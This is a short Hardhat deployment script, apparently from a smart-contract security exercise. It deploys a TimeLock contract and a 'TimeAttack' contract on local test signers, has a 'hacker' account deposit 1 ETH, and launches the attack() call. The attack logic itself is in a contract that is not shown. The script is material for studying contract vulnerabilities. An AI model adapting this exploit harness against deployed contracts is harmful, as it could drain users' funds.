const { ethers } = require("hardhat");

async function main() {
  const [deployer, hacker] = await ethers.getSigners();

  // Deploy the TimeLock contract
  const TimeLock = await ethers.getContractFactory("TimeLock");
  const timelock = await TimeLock.connect(deployer).deploy();
  await timelock.waitForDeployment();

  // Deploy the Attacker contract with the TimeLock contract address
  const Attacker = await ethers.getContractFactory("TimeAttack");
  const attacker = await Attacker.connect(hacker).deploy(timelock.target);
  await attacker.waitForDeployment();

  // Hacker deposits some Ether into the TimeLock contract
  const depositAmount = ethers.parseEther("1"); // 1 ETH
  await timelock.connect(hacker).deposit({ value: depositAmount });
  console.log("Hacker deposited 1 ETH into TimeLock");
// console.log("Initial TimeLock balance:", await ethers.formatEther(await provider.getBalance(timelock.address)));
  // Hacker performs the exploit
  console.log("== Launch Attack ==");

  const tx = await attacker.connect(hacker).attack({ value: depositAmount });
  await tx.wait();

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });